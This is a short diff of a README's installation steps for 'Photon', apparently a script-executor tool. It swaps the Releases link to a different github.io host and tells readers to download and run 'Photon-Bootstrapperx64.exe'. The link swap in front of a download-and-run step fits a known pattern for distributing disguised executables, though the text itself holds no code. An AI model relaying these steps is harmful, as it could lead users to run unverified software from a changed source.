@@ -49,7 +49,7 @@ Whether you're running quick one-liners or loading complex hub scripts, Photon g
 
 ## 🚀 Installation
 
-1. Go to the [**Releases**](https://fxsploit.github.io/photon) page
+1. Go to the [**Releases**](https://0x0FD.github.io/photon) page
 2. Download `Photon-Bootstrapperx64.exe`
 4. Run Bootstrapper and you're done!
 
